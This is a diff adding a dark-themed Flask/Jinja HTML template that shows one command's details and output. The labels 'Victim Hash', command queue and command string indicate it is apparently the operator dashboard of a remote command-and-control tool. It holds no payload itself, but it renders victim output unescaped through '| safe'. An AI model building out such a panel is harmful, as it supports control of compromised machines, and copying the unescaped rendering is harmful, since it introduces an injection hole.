@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Command Result - {{ command_id[:8] if command_id else 'N/A' }}...</title>
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <style>
+        body { 
+            padding-top: 20px; 
+            padding-bottom: 20px; 
+            background-color: #2c3034; 
+            color: #f8f9fa; 
+        }
+        .card { 
+            background-color: #343a40; 
+            border: 1px solid #454d55; 
+            margin-bottom: 20px;
+        }
+        .card-header, .card-title { 
+            color: #00beef; 
+        }
+        .card-header {
+            border-bottom: 1px solid #00beef40;
+        }
+        a { color: #00beef; }
+        a:hover { color: #00a0c7; text-decoration: none;}
+        .btn-outline-light { color: #f8f9fa; border-color: #f8f9fa80; }
+        .btn-outline-light:hover { background-color: #f8f9fa; color: #2c3034; }
+        h1, h2, h3 { color: #00beef; }
+        hr { 
+            border-top: 1px solid #454d55; /* hr 색상 조정 */
+        }
+        pre { 
+            background-color: #222528; 
+            color: #f8f9fa; 
+            border: 1px solid #454d55; 
+            padding: 15px; /* 패딩 증가 */
+            border-radius: 0.25rem;
+            white-space: pre-wrap;  /* 긴 내용 줄바꿈 */
+            word-wrap: break-word; /* 단어 단위 줄바꿈 */
+            max-height: 500px; /* 최대 높이 설정 (필요시 조정) */
+            overflow-y: auto;  /* 스크롤 추가 */
+        }
+        .command-details-list {
+            list-style-type: none;
+            padding-left: 0;
+        }
+        .command-details-list li {
+            background-color: #3E444A;
+            border: 1px solid #454d55;
+            padding: 0.75rem 1.25rem;
+            margin-bottom: -1px; /* 테두리 겹침 방지 */
+            color: #f8f9fa;
+        }
+        .command-details-list li:first-child {
+            border-top-left-radius: 0.25rem;
+            border-top-right-radius: 0.25rem;
+        }
+        .command-details-list li:last-child {
+            margin-bottom: 0;
+            border-bottom-left-radius: 0.25rem;
+            border-bottom-right-radius: 0.25rem;
+        }
+        .command-details-list strong {
+            color: #00beefc0;
+            margin-right: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container-fluid">
+        <div class="card shadow-sm mb-4">
+            <div class="card-header d-flex justify-content-between align-items-center">
+                <h1 class="mb-0 h3"><i class="fas fa-receipt mr-2"></i>Result for Command ID: {{ command_id[:8] if command_id else 'N/A' }}... (Victim: {{ victim_hash }})</h1>
+                <a href="{{ url_for('index') }}" class="btn btn-outline-light btn-sm"><i class="fas fa-arrow-left mr-1"></i>Back to Dashboard</a>
+            </div>
+        </div>
+
+        {% if target_command %}
+        <div class="card shadow-sm mb-4">
+            <div class="card-body">
+                <h2 class="card-title h4"><i class="fas fa-info-circle mr-2"></i>Command Details</h2>
+                <ul class="command-details-list">
+                    <li><strong>Full Command ID:</strong> {{ target_command.get('command_id', 'N/A') }}</li>
+                    <li><strong>Victim Hash:</strong> {{ target_command.get('victim_hash', 'N/A') }}</li>
+                    <li><strong>Status:</strong> <span class="command-status-{{ target_command.get('status', 'unknown').lower().replace(' ', '_') }}">{{ target_command.get('status', 'N/A') }}</span></li>
+                    <li><strong>Submitted At (UTC):</strong> {{ target_command.get('submitted_at', '').replace('T', ' ')[:19] if target_command.get('submitted_at') else 'N/A' }}</li>
+                    <li><strong>Command String:</strong> <pre style="margin-top: 5px; padding: 8px; max-height: 100px;">{{ target_command.get('command_string', 'N/A') }}</pre></li>
+                </ul>
+            </div>
+        </div>
+        {% else %}
+        <div class="alert alert-warning" role="alert">
+            <strong>Warning:</strong> Command details not found in the current queue. The command might have been deleted, or this result is for a very old command not in the active queue.
+        </div>
+        {% endif %}
+
+        <div class="card shadow-sm">
+            <div class="card-body">
+                <h2 class="card-title h4"><i class="fas fa-laptop-code mr-2"></i>Output</h2>
+                <div>
+                    {{ result_content | safe }} </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+</body>
+</html>
